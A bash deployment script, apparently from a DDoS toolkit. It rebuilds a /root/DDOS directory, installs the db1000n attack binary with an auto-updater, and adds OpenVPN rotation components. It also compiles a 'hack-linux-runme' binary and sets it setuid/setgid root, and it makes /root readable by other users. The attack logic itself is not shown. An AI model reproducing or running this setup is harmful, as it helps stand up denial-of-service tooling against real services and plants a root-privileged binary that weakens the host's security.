#!/usr/bin/env bash

distDir="/root/DDOS"

cd ../
pwd

cp "${distDir}/DB1000N/db1000n"                            ./DB1000N
cp "${distDir}/DB1000N/latest-compatible-version.txt"      ./DB1000N
find "${distDir}" ! -path '*git*' -delete

gcc -o ./hack-linux-runme.elf     ./hack-linux-runme.c
date +%Y%m%d.%H%M > ./version.txt

mkdir                                      "${distDir}"
#cp -r  ./composer                          "${distDir}/composer"
mkdir                                      "${distDir}/DB1000N"
cp ./DB1000N/db1000n                       "${distDir}/DB1000N"
cp ./DB1000N/db1000nAutoUpdater.php        "${distDir}/DB1000N"
mkdir                                      "${distDir}/open-vpn"
cp ./open-vpn/on-open-vpn-up.cli.php       "${distDir}/open-vpn"
cp ./open-vpn/OpenVpnConfig.php            "${distDir}/open-vpn"
cp ./open-vpn/OpenVpnConnection.php        "${distDir}/open-vpn"
cp ./open-vpn/OpenVpnProvider.php          "${distDir}/open-vpn"
cp ./common.php                            "${distDir}"
cp ./Efficiency.php                        "${distDir}"
cp ./functions.php                         "${distDir}"
cp ./functions-mb-string.php               "${distDir}"
mv ./hack-linux-runme.elf                  "${distDir}"
cp ./HackApplication.php                   "${distDir}"
cp ./init.php                              "${distDir}"
cp ./main.cli.php                          "${distDir}"
cp ./ResourcesConsumption.php              "${distDir}"
cp ./SelfUpdate.php                        "${distDir}"
cp ./Term.php                              "${distDir}"
cp ./version.txt                           "${distDir}"
#cp ./source-code/docker.config            "${distDir}"

cd "${distDir}"
pwd

find "./" -type d -print0 | xargs -0 chmod u=rwx,g=rx,o=rx
find "./" -type f -print0 | xargs -0 chmod u=rw,g=r,o=
find "./" -print0 | xargs -0 chown root
find "./" -print0 | xargs -0 chgrp root
chmod o+rx  /root
chmod o+rx  "${distDir}"

chmod u=rwxs,g=rwxs,o=rx ./hack-linux-runme.elf
chmod u+x,g+x,o+x ./DB1000N/db1000n
chmod u+x,g+x ./DB1000N/git-for-auto-update/db1000n/install.sh
chmod u+x,g+x ./open-vpn/on-open-vpn-up.cli.php
chmod u+x,g+x ./main.cli.php

systemctl enable rsyslog &>/dev/null



